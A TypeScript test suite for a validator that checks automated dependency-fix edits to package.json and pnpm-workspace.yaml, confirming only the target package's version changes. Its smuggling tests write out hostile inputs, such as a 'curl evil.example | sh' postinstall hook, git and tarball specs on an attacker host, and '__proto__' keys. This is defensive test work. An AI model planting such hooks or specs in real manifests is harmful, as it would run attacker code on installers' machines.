import { describe, expect, it } from 'vitest';
import { checkPackageJson, checkPnpmWorkspace } from './js-manifest';
import type { FixCheckContext, FixCheckResult } from './types';

const ctx: FixCheckContext = {
  family: 'js',
  packageName: 'qf-a',
  targets: [{ installed: '1.2.5', target: '1.2.6', lockfile: 'package-lock.json' }],
};

type Manifest = Record<string, unknown>;

const BASE: Manifest = {
  name: 'app',
  version: '1.0.0',
  repository: { type: 'git', url: 'https://gitlab.example/app.git' },
  scripts: { test: 'vitest run' },
  dependencies: { 'qf-b': '^2.0.0' },
  devDependencies: { 'qf-a': '^1.2.5', typescript: '^5.6.3' },
};

const json = (value: unknown): string => JSON.stringify(value, null, 2) + '\n';

/** A package.json change made by `edit` on a copy of `base`. */
function packageJson(edit: (pkg: Manifest) => void, base: Manifest = BASE): FixCheckResult {
  const next = structuredClone(base);
  edit(next);
  return checkPackageJson({ path: 'package.json', base: json(base), next: json(next) }, ctx);
}

const refused = (rule: string, path = 'package.json') => ({ ok: false, rule, path });

describe('checkPackageJson: allowed', () => {
  it('accepts no change', () => {
    expect(packageJson(() => undefined)).toEqual({ ok: true });
  });

  it('accepts a changed version spec of the package in its dependency section', () => {
    expect(packageJson((pkg) => ((pkg.devDependencies as Manifest)['qf-a'] = '^1.2.6'))).toEqual({
      ok: true,
    });
  });

  it.each<[string, (pkg: Manifest) => void]>([
    ['a new overrides', (pkg) => (pkg.overrides = { 'qf-a': '^1.2.6' })],
    ['pnpm.overrides["qf-a@<2"]', (pkg) => (pkg.pnpm = { overrides: { 'qf-a@<2': '^1.2.6' } })],
    [
      'resolutions["qf-a@npm:^1.0.0"]',
      (pkg) => (pkg.resolutions = { 'qf-a@npm:^1.0.0': '^1.2.6' }),
    ],
    ['resolutions["**/qf-a"]', (pkg) => (pkg.resolutions = { '**/qf-a': '1.2.6' })],
    ['pnpm.overrides["qf-b>qf-a"]', (pkg) => (pkg.pnpm = { overrides: { 'qf-b>qf-a': '^1.2.6' } })],
    [
      'pnpm.overrides["@scope/p@2>qf-a"]',
      (pkg) => (pkg.pnpm = { overrides: { '@scope/p@2>qf-a': '^1.2.6' } }),
    ],
    [
      'overrides["qf-a@>=1.0.0 <2.0.0"]',
      (pkg) => (pkg.overrides = { 'qf-a@>=1.0.0 <2.0.0': '^1.2.6' }),
    ],
  ])('accepts %s', (_name, edit) => {
    expect(packageJson(edit)).toEqual({ ok: true });
  });

  it('accepts a changed pin and a pin added beside other overrides', () => {
    const base = { ...BASE, overrides: { 'qf-a': '^1.2.5', 'qf-c': '1.0.0' }, pnpm: { x: 1 } };
    expect(
      packageJson((pkg) => {
        pkg.overrides = { 'qf-a': '^1.2.6', 'qf-c': '1.0.0' };
        pkg.pnpm = { x: 1, overrides: { 'qf-a': '^1.2.6' } };
      }, base),
    ).toEqual({ ok: true });
  });

  it('ignores key order', () => {
    const reordered = { devDependencies: BASE.devDependencies, ...BASE };
    expect(packageJson(() => undefined, reordered)).toEqual({ ok: true });
  });
});

describe('checkPackageJson: smuggling (§11.8)', () => {
  it('refuses an added postinstall script', () => {
    expect(
      packageJson((pkg) => ((pkg.scripts as Manifest).postinstall = 'curl evil.example | sh')),
    ).toEqual(refused('other_change'));
  });

  it('refuses a new dependency', () => {
    expect(packageJson((pkg) => ((pkg.dependencies as Manifest).evil = '^1.0.0'))).toEqual(
      refused('new_dependency'),
    );
    expect(packageJson((pkg) => (pkg.optionalDependencies = { evil: '1.0.0' }))).toEqual(
      refused('new_dependency'),
    );
  });

  it.each([
    'git+https://evil.example/x.git',
    'https://evil.example/a.tgz',
    'file:../x',
    'npm:evil@1.0.0',
    'github:evil/x',
    'evil/x',
    'link:../x',
    'workspace:*',
    'catalog:',
    '$qf-a',
    'latest',
    '',
  ])('refuses the spec %j', (spec) => {
    expect(packageJson((pkg) => ((pkg.devDependencies as Manifest)['qf-a'] = spec))).toEqual(
      refused('bad_spec'),
    );
    expect(packageJson((pkg) => (pkg.overrides = { 'qf-a': spec }))).toEqual(refused('bad_spec'));
  });

  it('refuses a pin that is not a string', () => {
    expect(
      packageJson((pkg) => (pkg.overrides = { 'qf-a': { '.': '1.2.6', evil: '1.0.0' } })),
    ).toEqual(refused('bad_spec'));
    expect(packageJson((pkg) => ((pkg.devDependencies as Manifest)['qf-a'] = 1))).toEqual(
      refused('bad_spec'),
    );
  });

  it.each<[string, (pkg: Manifest) => void]>([
    ['a changed name', (pkg) => (pkg.name = 'evil')],
    ['a changed repository', (pkg) => (pkg.repository = 'https://evil.example/app.git')],
    [
      'a changed version of another package',
      (pkg) => ((pkg.dependencies as Manifest)['qf-b'] = '^3.0.0'),
    ],
    ['a removed dependency', (pkg) => delete (pkg.devDependencies as Manifest).typescript],
    [
      'the package added to another section',
      (pkg) => ((pkg.dependencies as Manifest)['qf-a'] = '^1.2.6'),
    ],
    ['an override of another package', (pkg) => (pkg.overrides = { evil: '1.0.0' })],
    [
      'an override under the package’s parent only',
      (pkg) => (pkg.overrides = { 'qf-a>evil': '1.0.0' }),
    ],
    ['a selector with a bad range', (pkg) => (pkg.overrides = { 'qf-a@evil': '^1.2.6' })],
    ['an empty override container', (pkg) => (pkg.overrides = {})],
    [
      'another pnpm setting',
      (pkg) => (pkg.pnpm = { overrides: { 'qf-a': '^1.2.6' }, onlyBuiltDependencies: ['evil'] }),
    ],
    ['a workspaces list', (pkg) => (pkg.workspaces = ['evil/*'])],
  ])('refuses %s', (_name, edit) => {
    expect(packageJson(edit)).toEqual(refused('other_change'));
  });

  it('reads own keys only (no prototype keys)', () => {
    const base = '{"dependencies":{"qf-b":"^2.0.0"}}';
    const next = '{"dependencies":{"qf-b":"^2.0.0","constructor":"1.0.0"},"__proto__":{"x":1}}';
    expect(checkPackageJson({ path: 'package.json', base, next }, ctx)).toEqual(
      refused('new_dependency'),
    );
    const proto = '{"dependencies":{"qf-b":"^2.0.0"},"__proto__":{"scripts":{}}}';
    expect(checkPackageJson({ path: 'package.json', base, next: proto }, ctx)).toEqual(
      refused('other_change'),
    );
  });
});

describe('checkPackageJson: format', () => {
  it('reads through CRLF line endings and a BOM (Review Focus 1)', () => {
    const crlf = (text: string) => '\uFEFF' + text.replaceAll('\n', '\r\n');
    const base = crlf(json(BASE));
    const next = crlf(json(BASE).replace('"qf-a": "^1.2.5"', '"qf-a": "^1.2.6"'));
    expect(next).not.toBe(base);
    expect(checkPackageJson({ path: 'web/package.json', base, next }, ctx)).toEqual({ ok: true });
  });

  it.each(['{"name": "app",', '[]', 'null', '"text"'])(
    'answers unparsable for %j instead of throwing',
    (next) => {
      expect(checkPackageJson({ path: 'package.json', base: json(BASE), next }, ctx)).toEqual(
        refused('unparsable'),
      );
    },
  );

  it('compares deeply nested JSON without recursion limits', () => {
    const deep = (leaf: string) => `{"config":${'['.repeat(200_000)}${leaf}${']'.repeat(200_000)}}`;
    const change = (next: string) => ({ path: 'package.json', base: deep('1'), next });
    expect(checkPackageJson(change(deep('1')), ctx)).toEqual({ ok: true });
    expect(checkPackageJson(change(deep('2')), ctx)).toEqual(refused('other_change'));
  });
});

const WORKSPACE = `packages:
  - 'apps/*'
  - 'packages/*'

catalog:
  react: ^18.3.1
`;

function workspace(next: string, base = WORKSPACE): FixCheckResult {
  return checkPnpmWorkspace({ path: 'pnpm-workspace.yaml', base, next }, ctx);
}

describe('checkPnpmWorkspace', () => {
  it('accepts an added overrides entry for the package', () => {
    expect(workspace(WORKSPACE + "\noverrides:\n  qf-a: '^1.2.6'\n")).toEqual({ ok: true });
    expect(workspace(WORKSPACE + '\noverrides:\n  "qf-a@<2": ^1.2.6\n')).toEqual({ ok: true });
  });

  it('accepts a changed overrides entry, and a first one in an empty file', () => {
    const base = WORKSPACE + 'overrides:\n  qf-a: ^1.2.5\n  qf-c: 1.0.0\n';
    expect(workspace(base.replace('^1.2.5', '^1.2.6'), base)).toEqual({ ok: true });
    expect(workspace('overrides:\n  qf-a: ^1.2.6\n', '')).toEqual({ ok: true });
  });

  it('refuses a changed packages list', () => {
    expect(workspace(WORKSPACE.replace("'packages/*'", "'evil/*'"))).toEqual(
      refused('other_change', 'pnpm-workspace.yaml'),
    );
  });

  it('refuses other settings and other overrides', () => {
    expect(workspace(WORKSPACE + 'onlyBuiltDependencies:\n  - evil\n')).toMatchObject({
      rule: 'other_change',
    });
    expect(workspace(WORKSPACE + 'overrides:\n  evil: 1.0.0\n')).toMatchObject({
      rule: 'other_change',
    });
    expect(workspace(WORKSPACE.replace('^18.3.1', '^19.0.0'))).toMatchObject({
      rule: 'other_change',
    });
  });

  it.each(['git+https://evil.example/x.git', 'link:../evil', '"catalog:"', '1.10', '[^1.2.6]'])(
    'refuses the override value %j',
    (value) => {
      expect(workspace(WORKSPACE + `overrides:\n  qf-a: ${value}\n`)).toMatchObject({
        rule: 'bad_spec',
      });
    },
  );

  it('applies merge keys as pnpm’s YAML reader does', () => {
    expect(workspace(WORKSPACE + 'overrides:\n  <<: {qf-a: ^1.2.6}\n')).toEqual({ ok: true });
    const anchored = WORKSPACE.replace('catalog:', 'catalog: &cat');
    expect(
      workspace(anchored + 'overrides:\n  <<: *cat\n  qf-a: ^1.2.6\n', anchored),
    ).toMatchObject({ rule: 'other_change' });
  });

  it.each(['packages: [', 'a: 1\na: 2\n', 'a: 1\n---\nb: 2\n', '- a\n- b\n'])(
    'answers unparsable for %j instead of throwing',
    (next) => {
      expect(workspace(next)).toEqual(refused('unparsable', 'pnpm-workspace.yaml'));
    },
  );
});
